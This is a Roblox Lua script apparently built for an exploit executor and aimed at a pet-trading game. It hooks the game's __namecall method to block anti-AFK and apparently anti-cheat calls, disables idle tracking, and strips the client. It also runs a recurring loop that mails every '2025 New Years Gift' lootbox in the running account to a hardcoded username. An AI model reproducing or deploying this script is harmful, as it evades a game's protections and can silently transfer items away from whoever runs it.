while game.PlaceId ~= 15502339080 do 
    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("GuildCastle_UnlockGate"):InvokeServer()
    task.wait(5)
    game:GetService("TeleportService"):Teleport(15502339080, game.Players.LocalPlayer)
end


local function LowGraphics()
    pcall(function()
        Lighting = game:GetService("Lighting")
        local Terrain = workspace:FindFirstChildOfClass('Terrain')
        Terrain.WaterWaveSize = 0
        Terrain.WaterWaveSpeed = 0
        Terrain.WaterReflectance = 0
        Terrain.WaterTransparency = 0
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        for i,v in pairs(game:GetDescendants()) do
            if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") or v:IsA("CornerWedgePart") or v:IsA("TrussPart") then
                v.Material = "Plastic"
                v.Reflectance = 0
            elseif v:IsA("Decal") then
                v.Transparency = 1
            elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
                v.Lifetime = NumberRange.new(0)
            elseif v:IsA("Explosion") then
                v.BlastPressure = 1
                v.BlastRadius = 1
            end
        end
        for i,v in pairs(Lighting:GetDescendants()) do
            if v:IsA("BlurEffect") or v:IsA("SunRaysEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("BloomEffect") or v:IsA("DepthOfFieldEffect") then
                v.Enabled = false
            end
        end
        workspace.DescendantAdded:Connect(function(child)
            task.spawn(function()
                if child:IsA('ForceField') then
                    game.RunService.Heartbeat:Wait()
                    child:Destroy()
                elseif child:IsA('Sparkles') then
                    game.RunService.Heartbeat:Wait()
                    child:Destroy()
                elseif child:IsA('Smoke') or child:IsA('Fire') then
                    game.RunService.Heartbeat:Wait()
                    child:Destroy()
                end
            end)
        end) 
    end)

    -- Low Processing
    for i, v in workspace:GetChildren() do
        pcall(function()
            if v.Name == "animate" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "PhantrancDGtp" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "ALWAYS_RENDERING" then
                v.Parent = game.ReplicatedStorage
            end
        end)
    end

    for i, v in pairs(workspace.__THINGS:GetChildren()) do
        pcall(function()
            if v.Name == "Sounds" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "RandomEvents" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "Flags" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "Hoverboards" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "Booths" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "ExclusiveEggs" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "ExclusiveEggPets" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "BalloonGifts" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "Sprinklers" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "Eggs" then
                v.Parent = game.ReplicatedStorage
            end
        end)
        pcall(function()
            if v.Name == "ShinyRelics" then
                v.Parent = game.ReplicatedStorage
            end
        end)
    end

    pcall(function()
        workspace.__THINGS.__INSTANCE_CONTAINER.ServerOwned.Parent = game.ReplicatedStorage
    end)

    local entities = {
        "Stats", 
        "Chat", 
        "Debris",
        "CoreGui",
    }
    for _, entity in entities do
        pcall(function()
            for i, v in game[entity]:GetDescendants() do
                pcall(function() v:Destroy() end)
            end
        end)
    end
end

local function Optimizer()

    LowGraphics()
    local Player = game.Players.LocalPlayer
    for i, v in Player.PlayerScripts:GetChildren() do
        pcall(function()
            v:Destroy()
        end)
    end

    for i, v in workspace:GetChildren() do
        if not (v.Name == "__THINGS" or v.Name == Player.Name)  then
            pcall(function()
                v:Destroy()
            end)
        end
    end

    for i, v in workspace.__THINGS:GetChildren() do
        if not (v.Name == "__INSTANCE_CONTAINER" or v.Name == "Instances") then
            pcall(function()
                v:Destroy()
            end)
        end
    end

    local Player = game.Players.LocalPlayer
    for i, v in Player.PlayerGui:GetDescendants() do
        pcall(function() v.Enabled = false end)
    end
end

-- Delete other player characters for less processing
spawn(function()
    while true do
        task.wait(30)
        for i, v in game.Players:GetPlayers() do
            if v ~= game.Players.LocalPlayer then
                pcall(function()
                    local Character = v.Character
                    Character:Destroy()
                end)
            end
        end
    end
end)
    

repeat task.wait() until game:IsLoaded()

--Anti AFK
game.Players.LocalPlayer.PlayerScripts.Scripts.Core["Idle Tracking"].Enabled = false
local vu = game:GetService("VirtualUser")
game:GetService('Players').LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),Workspace.CurrentCamera.CFrame)
    task.wait(1)
    vu:Button2Up(Vector2.new(0,0),Workspace.CurrentCamera.Frame)
end)
local old 
old = hookmetamethod(game,"__namecall",(function(...) 
    local self,arg = ...
    if not checkcaller() then 
        if tostring(self) == "__BLUNDER" or tostring(self) == "Idle Tracking: Update Timer" or tostring(self) == "Move Server" then return end
    end
    return old(...)
end))
game.ReplicatedStorage.Network["Idle Tracking: Stop Timer"]:FireServer()

setfpscap(3)

task.spawn(function()
    Optimizer()
end)


spawn(function()
    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local username = "TheArex2006"
    local loopInterval = 5 
    while true do
        local playerInventory = Save.Get()["Inventory"]
        local LootboxInv = playerInventory["Lootbox"]
        print("Searching for 2025 New Years Gift...")
        for key, item in pairs(LootboxInv) do
            if item.id == "2025 New Years Gift" then
                print("Found 2025 New Years Gift item:", item)
                local amount = item._am or item.am or 1
                print("Amount to send:", amount)
                local args = {
                    [1] = username,
                    [2] = "Take these gifts",
                    [3] = "Lootbox",
                    [4] = key,
                    [5] = amount
                }
                print("Invoking Server with args:", unpack(args))
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
                break
            end
        end
        print("Finished processing 2025 New Years Gifts.")
        task.wait(loopInterval * 60)
    end
end)

